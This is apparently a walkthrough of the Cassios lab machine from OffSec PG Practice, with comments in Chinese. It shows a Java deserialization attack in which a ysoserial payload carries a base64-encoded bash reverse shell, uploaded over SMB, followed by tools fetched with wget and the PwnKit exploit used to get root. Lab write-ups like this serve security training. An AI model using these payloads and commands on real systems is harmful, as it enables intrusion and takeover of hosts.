###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# Cassios
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.172.116 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.172.116:22
Open 192.168.172.116:80
Open 192.168.172.116:139
Open 192.168.172.116:445
Open 192.168.172.116:8080

PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http        syn-ack Apache httpd 2.4.6 ((CentOS))
|_http-server-header: Apache/2.4.6 (CentOS)
|_http-title: Landed by HTML5 UP
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.10.4 (workgroup: SAMBA)
8080/tcp open  http-proxy  syn-ack
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS POST
|_http-favicon: Unknown favicon MD5: A6A122A54CC447ED63502C5749919325
|_http-title: Site doesn't have a title (text/html;charset=UTF-8).
|_http-open-proxy: Proxy might be redirecting requests
```

buster
```
301      GET        7l       20w      238c http://192.168.172.116/assets => http://192.168.172.116/assets/
301      GET        7l       20w      246c http://192.168.172.116/backup_migrate => http://192.168.172.116/backup_migrate/
200      GET     1887l     5716w   335351c http://192.168.172.116/backup_migrate/recycler.tar
301      GET        7l       20w      238c http://192.168.172.116/images => http://192.168.172.116/images/
```

匿名登入smb，下載`recycler.ser`，file看他
```
┌──(kali㉿kali)-[~/pgplay]
└─$ smbclient -N -L 192.168.172.116 

┌──(kali㉿kali)-[~/pgplay]
└─$ smbclient -N //192.168.172.116/"Samantha Konstan"
smb: \> ls
  .                                   D        0  Thu Oct  1 16:28:46 2020
  ..                                  D        0  Thu Sep 24 13:38:10 2020
  recycler.ser                        N        0  Wed Sep 23 21:35:15 2020
  readme.txt                          N      478  Thu Sep 24 13:32:50 2020
  spring-mvc-quickstart-archetype      D        0  Thu Sep 24 13:36:11 2020
  thymeleafexamples-layouts           D        0  Thu Sep 24 13:37:09 2020
  resources.html                      N    42713  Thu Sep 24 13:37:41 2020
  pom-bak.xml                         N     2187  Thu Oct  1 16:28:46 2020
  
smb: \> get recycler.ser

┌──(kali㉿kali)-[~/pgplay]
└─$ file recycler.ser
recycler.ser: Java serialization data, version 5
```

參考[hacktricks - Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization?source=post_page-----4686e6fa8df6--------------------------------#ysoserial)，下載下來之後先切成`java 11`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ sudo apt-get install openjdk-11-jdk

┌──(kali㉿kali)-[~/pgplay]
└─$ sudo update-alternatives --config java
There are 3 choices for the alternative java (providing /usr/bin/java).

  Selection    Path                                         Priority   Status
------------------------------------------------------------
* 0            /usr/lib/jvm/java-21-openjdk-amd64/bin/java   2111      auto mode
  1            /usr/lib/jvm/java-11-openjdk-amd64/bin/java   1111      manual mode
  2            /usr/lib/jvm/java-17-openjdk-amd64/bin/java   1711      manual mode
  3            /usr/lib/jvm/java-21-openjdk-amd64/bin/java   2111      manual mode

Press <enter> to keep the current choice[*], or type selection number: 1
update-alternatives: using /usr/lib/jvm/java-11-openjdk-amd64/bin/java to provide /usr/bin/java (java) in manual mode

┌──(kali㉿kali)-[~/pgplay]
└─$ java --version
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
openjdk 11.0.20-ea 2023-07-18
```

使用RCE的，上傳smb
```
# 轉base64
bash -i >& /dev/tcp/192.168.45.245/445 0>&1
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjI0NS80NDUgMD4mMQ==

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp445

┌──(kali㉿kali)-[~/pgplay]
└─$ java -jar ysoserial-all.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjI0NS80NDUgMD4mMQ==}|{base64,-d}|{bash,-i}" > recycler.ser

smb: \> rm recycler.ser
smb: \> put recycler.ser
```

在`dashboard`點`check status`就可以觸發shell，在`/home/samantha`可得local.txt
```
[samantha@cassios ~]$ cat local.txt
bddb0594e83da5623b4f77d9b61fc445
```

`linpeas.sh`
```
[samantha@cassios tmp]$ wget 192.168.45.245/linpeas.sh
[samantha@cassios tmp]$ chmod +x linpeas.sh
[samantha@cassios tmp]$ ./linpeas.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

使用[CVE-2021-4034](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py)得root，進/root得proof.txt
```
[samantha@cassios tmp]$ wget 192.168.45.245/CVE-2021-4034.py
[samantha@cassios tmp]$ python CVE-2021-4034.py
whoami
root

python -c 'import pty; pty.spawn("/bin/bash")'
[root@cassios root]# cat proof.txt
402468ac96ce42578c006c6ca53bbb14
```